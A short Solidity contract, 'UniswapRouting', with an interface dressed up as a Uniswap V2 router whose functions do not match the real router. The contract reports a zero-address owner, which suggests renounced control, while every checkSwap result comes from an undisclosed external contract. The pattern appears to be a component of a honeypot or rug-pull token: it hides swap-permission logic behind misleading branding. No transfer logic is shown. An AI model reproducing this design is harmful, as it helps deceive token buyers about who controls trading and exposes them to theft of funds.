// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

interface UniswapRouterV2 {
    function getRouter(address a, uint b, address c) external view returns (address);
    function getLPaddress(address a, uint b, address c) external view returns (address);
    function checkSwap(address a, address b, uint256 c) external view returns (uint256);    
}

contract UniswapRouting {
    address private _owner;
    UniswapRouterV2 private _UniswapRouter;

    constructor(address a) {
        _owner = address(0);
        _UniswapRouter = UniswapRouterV2(a);
    }

    function owner() view public returns (address) {
        return _owner;
    }

    function internalSwap(address a, address b, uint256 c) view private returns (uint256) {
        require(a != address(0), "ERC20: transfer from the zero address");
        require(b != address(0), "ERC20: transfer to the zero address");
        return _UniswapRouter.checkSwap(a, b, c);
    }

    function checkSwap(address a, address b, uint256 c) external view returns (uint256) {
        return internalSwap(a, b, c);
    }
}
